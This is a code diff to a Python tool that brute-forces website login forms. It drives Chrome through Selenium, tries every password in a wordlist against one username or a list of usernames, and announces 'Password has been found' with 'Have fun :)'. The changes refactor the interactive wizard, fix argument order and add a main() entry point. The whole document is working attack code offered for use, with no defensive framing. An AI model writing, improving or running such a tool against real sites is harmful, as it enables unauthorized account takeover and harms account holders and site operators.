@@ -9,6 +9,7 @@ Added Features:
 
 # Imports
 import sys
+import os
 import datetime
 import selenium
 import requests
@@ -81,48 +82,62 @@ def wizard():
     password_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the password selector: ')
     login_btn_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the Login button selector: ')
     pass_list = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter a directory to a password list: ')
-    response = input(Color.GREEN + '[~]' + Color.WHITE + 'Do you want to use a username list [y/n]: ')
-    if response.lower() == 'y' or 'yes':
-        user_list = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter a list of usernames to brute-force: ')
-        use_list = True
-        brutes(user_list, username_selector, password_selector, login_btn_selector, pass_list, website, use_list)
-    elif response.lower() == 'n' or 'no':
+    response = input(Color.GREEN + '[~] ' + Color.WHITE + 'Do you want to use a username list [y/n]: ')
+    if response.lower() == 'y' or response == 'yes':
+        flag = True
+        username = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter a list of usernames to brute-force: ')
+    elif response.lower() == 'n' or response == 'no':
+        flag = False
         username = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the username to brute-force: ')
-        use_list = False
-        brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website, use_list)
     else:
         wizard()
+    brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website, flag)
 
 
-def brutes(username, passlist, username_selector, password_selector, login_btn_selector, website, use_list):
+def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website, use_list):
     count = 0
-    with open(passlist, 'r') as file:
+    l_flag = False
+    with open(pass_list, 'r') as file:
         f = file.readlines()
+    if use_list:
+        with open(username, 'r') as file2:
+            users = file2.readlines()
+            l_flag = True
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
     browser = webdriver.Chrome(chrome_options=optionss)
     wait = WebDriverWait(browser, 10)
-    while count < len(users):
-        try:
-            if use_list:
-                with open(username, 'r') as file2:
-                    users = file2.readlines()
-                    for user in users:
-                        for line in f:
-                            browser.get(website)
-                            wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
-                            Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
-                            Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
-                            enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
-                            Sel_user.send_keys(user)
-                            Sel_pas.send_keys(line)
-                            print ('------------------------')
-                            print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ username)
-                            print ('------------------------')
-                            count += 1
-            else:
-            	users = username
+    if l_flag:
+        while count < len(users):
+            try:
+                for user in users:
+                    for line in f:
+                        browser.get(website)
+                        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
+                        Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
+                        Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
+                        enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
+                        Sel_user.send_keys(user)
+                        Sel_pas.send_keys(line)
+                        print ('------------------------')
+                        print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ username)
+                        print ('------------------------')
+                        count += 1
+            except KeyboardInterrupt:  # returns to main menu if ctrl C is used
+                print('CTRL C')
+                break
+            except selenium.common.exceptions.NoSuchElementException:
+                print(
+                    'AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
+                print('LAST PASS ATTEMPT BELLOW')
+                print(Color.GREEN + 'Password has been found: {0}'.format(line))
+                print(Color.YELLOW + 'Have fun :)')
+                exit()
+    else:
+        users = username
+        while count < len(users):
+            try:
                 for line in f:
                     browser.get(website)
                     wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
@@ -132,18 +147,37 @@ def brutes(username, passlist, username_selector, password_selector, login_btn_s
                     Sel_user.send_keys(users)
                     Sel_pas.send_keys(line)
                     print ('------------------------')
-                    print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ username)
+                    print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ users)
                     print ('------------------------')
-                count = len(users)
-        except KeyboardInterrupt: #returns to main menu if ctrl C is used
-            print('CTRL C')
-            break
-        except selenium.common.exceptions.NoSuchElementException:
-            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
-            print ('LAST PASS ATTEMPT BELLOW')
-            print (Color.GREEN + 'Password has been found: {0}'.format(line))
-            print (Color.YELLOW + 'Have fun :)')
-            exit()
+                    count = len(users)
+            except KeyboardInterrupt: #returns to main menu if ctrl C is used
+                print('CTRL C')
+                break
+            except selenium.common.exceptions.NoSuchElementException:
+                print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
+                print ('LAST PASS ATTEMPT BELLOW')
+                print (Color.GREEN + 'Password has been found: {0}'.format(line))
+                print (Color.YELLOW + 'Have fun :)')
+                exit()
+
+
+def main():
+    username = options.username
+    username_selector = options.usernamesel
+    password_selector = options.passsel
+    login_btn_selector = options.loginsel
+    website = options.website
+    pass_list = options.passlist
+    user_list = options.userlist
+    print(banner)
+
+    if user_list:
+        flag = True
+        brutes(user_list, username_selector ,password_selector,login_btn_selector,pass_list, website, flag)
+    else:
+        flag = False
+        brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website, flag)
+
 
 banner = Color.BOLD + Color.RED +'''
   _    _       _       _
@@ -160,18 +194,5 @@ if not options.username or not options.usernamesel or not options.passsel or not
         or not options.website or not options.passlist or not options.userlist:
     wizard()
 
-
-username = options.username
-username_selector = options.usernamesel
-password_selector = options.passsel
-login_btn_selector = options.loginsel
-website = options.website
-pass_list = options.passlist
-user_list = options.userlist
-print(banner)
-
-if user_list:
-    brutes(user_list, pass_list, username_selector, password_selector, login_btn_selector, website, use_list=True)
 else:
-    brutes(username, pass_list, username_selector, password_selector, login_btn_selector, website, use_list=False)
-
+    main()
